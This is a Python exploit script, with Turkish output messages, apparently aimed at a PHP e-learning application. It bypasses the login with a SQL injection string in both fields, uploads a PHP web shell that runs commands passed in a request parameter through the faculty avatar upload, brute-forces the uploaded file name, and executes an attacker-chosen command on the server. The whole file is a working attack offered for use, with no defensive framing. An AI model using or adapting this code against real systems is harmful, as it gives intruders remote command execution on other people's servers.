import os
import time
import argparse
import requests
import sys
from colorama import init
from colorama import Fore
from colorama import Back
from colorama import Style
init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
def banner():
	print('''''')
banner()
def my_args():
	parser = argparse.ArgumentParser(epilog="Example : python3 -u http://localhost/elearning -r 1000 -c whoami")
	parser.add_argument("-u","--url",type=str,required=True,help="url of target")
	parser.add_argument("-r","--range",type=int,required=True,help="range for bruteforce the webshell name")
	parser.add_argument("-c","--command",type=str,required=True,help="command to execute")
	my_arguments = parser.parse_args()
	return my_arguments
def login_with_sqli_login_bypass(user,passw):
	global session
	global url
	global cookies
	url = my_args().url
	session = requests.Session()
	data = {
	"username" : user,
	"password" : passw,
	}
	try:
		response = session.post(url + "/classes/Login.php?f=login",data=data,verify=False)
		print(Fore.YELLOW+"[+]"+Fore.RESET+" Başarıyla giriş yapıldı!")
		cookies = response.cookies.get_dict()
	except requests.HTTPError as exception:
		print(Fore.RED+"[-]"+Fore.RESET+" HTTP hatası: {}".format(exception))
		sys.exit(1)
login_with_sqli_login_bypass("' or 1=1 -- -","' or 1=1 -- -")
def main(shell_name, renamed_shell):
	try:
		payload ={
			"id" : "",
			"faculty_id" : "test",
			"firstname" : "test",
			"lastname" : "test",
			"middlename" : "fsdfsd",
			"dob" : "2021-10-29",
			"gender": "Male",
			"department_id" : "1",
			"email" : "zebi@gmail.com",
			"contact" : "zebii",
			"address" :  "zebii",	
		}
		files = {
			"img" :
				(
					shell_name,
					"<?php echo \"<pre><h1>nikmok</h1>\" . shell_exec($_REQUEST['cmd']) . \"</pre>\"?>",
					"application/octet-stream",
					)
		}
		vunlerable_file = "/classes/Master.php?f=save_faculty"
		print(Fore.BLUE+"[*]"+Fore.RESET+" Web Shell'i yüklemeye çalışıyorum ....")
		response_2 = session.post(url + vunlerable_file,data=payload,cookies=cookies,files=files)
		# print(Fore.BLUE+"[*]"+Fore.RESET+" Web Shell'i kabartmaya çalışıyorum ....")
		rangee = my_args().range
		for i in range(0,rangee):
			try:
				with requests.get(url + "/uploads/Favatar_" + str(i) + ".php?cmd=whoami",allow_redirects=False) as response3:
					if "nikmok" in response3.text and response3.status_code == 200:
						print(+Fore.YELLOW+"[+]"+Fore.RESET+" Dosya Bulundu: " + response3.url +"\n")
						with open("/root/.tmf/shell.txt",mode="w+") as writer:
							writer.write(response3.url)
							writer.close()
						break
					else:
						print(Fore.RED+"[-]"+Fore.RESET+" Dosya bulunamadı: " + response3.url)
			except requests.HTTPError as exception2:
				print(Fore.RED+"[-]"+Fore.RESET+" HTTP hatası: {0} ".format(exception2))
	except requests.HTTPError as error:
		print(Fore.RED+"[-]"+Fore.RESET+" HTTP hatası: ".format(error))
	command = my_args().command
	with requests.get(response3.url.replace("whoami",command)) as response4:
		print(Fore.BLUE+"[*]"+Fore.RESET+" Yürütülüyor {} ....".format(command))
		time.sleep(3)
		print("\n" + Style.BRIGHT + Fore.GREEN + response4.text + Fore.RESET)


main("unknown.php", "")